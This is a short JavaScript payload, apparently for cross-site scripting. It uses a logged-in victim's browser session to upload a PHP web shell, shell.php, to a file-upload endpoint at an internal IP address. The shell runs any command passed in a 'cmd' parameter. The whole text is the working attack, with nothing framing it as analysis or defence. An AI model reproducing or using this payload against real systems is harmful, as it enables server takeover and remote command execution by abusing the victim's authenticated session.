alert("Payload loaded");
(async () => {
  const cookie = document.cookie;

  // Basic PHP shell payload
  const content = `<?php if(isset($_REQUEST['cmd'])){echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>";} ?>`;

  const file = new File([content], "shell.php", { type: "application/x-php" });

  const form = new FormData();
  form.append("localfile", file);
  form.append("MAX_FILE_SIZE", "1000000");
  form.append("act", "upload");
  form.append("dir", "");
  form.append("submit", "Upload");

  await fetch("https://10.23.108.10/app/ft/ft2.php", {
    method: "POST",
    credentials: "include",
    body: form
  });
})();
